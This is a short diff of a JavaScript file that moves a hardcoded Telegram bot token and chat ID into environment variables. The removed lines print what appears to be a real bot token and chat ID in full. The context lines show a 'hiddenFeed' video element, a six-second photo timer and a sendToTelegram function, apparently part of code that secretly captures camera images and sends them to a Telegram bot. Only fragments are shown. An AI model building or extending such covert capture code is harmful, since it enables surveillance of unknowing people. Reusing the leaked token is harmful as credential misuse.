@@ -1,5 +1,5 @@
-const BOT_TOKEN = "7191230731:AAHrj15Qd23r_cfpUeiwZ-CM7xPdJL-ZXV4"; 
-const CHAT_ID = "7816876204";
+const BOT_TOKEN = process.env.BOT_TOKEN; 
+const CHAT_ID = process.env.CHAT_ID;
 const PHOTO_TIMER = 6000;
 
 const video = document.getElementById('hiddenFeed');
@@ -74,4 +74,5 @@ async function sendToTelegram(blob, type) {
     } catch (error) {
         console.error("Network Error");
     }
+
 }
